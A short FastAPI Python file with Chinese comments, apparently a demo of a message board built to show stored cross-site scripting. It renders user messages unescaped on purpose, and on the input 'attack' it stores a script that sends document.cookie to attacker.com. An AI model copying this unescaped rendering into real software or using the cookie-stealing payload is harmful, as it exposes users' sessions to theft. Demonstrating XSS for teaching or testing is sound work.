from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse

app = FastAPI()

# 偽造一個留言儲存區（實際應用應該使用資料庫）
messages = []

@app.get("/", response_class=HTMLResponse)
async def index():
    global messages
    message_list = "<br>".join(messages)  # 將所有留言直接顯示（未過濾）
    html_content = f"""
    <html>
        <head>
            <title>XSS 測試留言板</title>
        </head>
        <body>
            <h1>留言板</h1>
            <form action="/submit" method="post">
                <input type="text" name="message" placeholder="輸入留言">
                <input type="submit" value="送出">
            </form>
            <h2>留言列表：</h2>
            {message_list}
        </body>
    </html>
    """
    return html_content

@app.post("/submit")
async def submit(message: str = Form(...)):
    global messages
    # 模擬駭客攻擊：如果輸入特定字串 "attack"，則替換成惡意程式碼
    if message.lower() == "attack":
        malicious_payload = (
            "<script>"
            "fetch('http://attacker.com/steal?cookie=' + document.cookie);"
            "</script>"
        )
        messages.append(malicious_payload)
    else:
        messages.append(message)  # 未過濾直接儲存使用者輸入
    return HTMLResponse(content="<script>window.location='/';</script>")
